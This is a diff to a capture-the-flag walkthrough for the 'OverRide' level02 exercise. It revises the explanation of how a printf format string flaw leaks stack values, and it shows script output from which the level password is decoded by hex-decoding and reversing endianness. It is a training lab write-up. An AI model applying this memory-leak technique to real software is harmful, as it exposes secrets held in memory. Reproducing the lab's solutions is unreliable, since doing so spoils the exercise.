@@ -16,7 +16,7 @@ admin does not have access!
 ## methodology
 - format string attack
 
-As the <code>main</code> function uses <code>print</code> to output raw array data, we can leverage it to display the variables stored on the stack.
+The `main` function uses `printf` to output raw array data, which makes it vulnerable to a format string attack. We can exploit this to display the variables stored on the stack.
 ``` shell
 level02@OverRide:~$ python /tmp/format_string.py
 Sequence 0x7fffffffe3d0 found on stack position 1
@@ -34,7 +34,8 @@ Sequence 0x7024383225 found on stack position 28
 Sequence 0x2900000000 found on stack position 40
 Sequence 0x602010 found on stack position 41
 ```
-Positions 22 to 26 include hex-encoded sequences that reveal the password after hex-decoding, reversing the endianness, and concatenating.
+
+Positions 22 to 26 contain hex-encoded sequences that reveal the password after hex-decoding, reversing the endianness, and concatenating them.
 
 ## flag
 ``` shell
